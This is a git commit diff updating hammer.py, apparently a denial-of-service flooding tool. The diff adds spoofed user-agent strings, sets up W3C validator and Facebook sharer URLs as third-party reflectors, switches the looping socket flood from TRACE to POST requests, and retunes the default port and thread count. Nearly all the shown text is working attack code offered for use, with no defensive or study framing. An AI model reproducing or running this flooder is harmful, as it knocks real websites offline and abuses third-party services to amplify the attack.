5293de3dad22ebf06862d089dce924b188ed4d15
rizkyghost <84271813+rizkyghost@users.noreply.github.com>
2021-05-16 19:00:47 +0700

    Update hammer.py

--- hammer.py
+++ hammer.py
@@ -13,15 +13,21 @@ import time,sys,socket,threading,logging,urllib.request,random
 def user_agent():
 	global uagent
 	uagent=[]
-	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36")
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
 	return(uagent)
 
 
 def my_bots():
 	global bots
 	bots=[]
-	bots.append("http://whatsapp.com")
-	bots.append("http://facebook.com")
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
 	return(bots)
 
 
@@ -38,7 +44,7 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			packet = str("TRACE / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			packet = str("POST / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
@@ -100,11 +106,11 @@ def get_parameters():
 	else:
 		usage()
 	if opts.port is None:
-		port = 587
+		port = 80
 	else:
 		port = opts.port
 	if opts.turbo is None:
-		thr = 160
+		thr = 135
 	else:
 		thr = opts.turbo
 
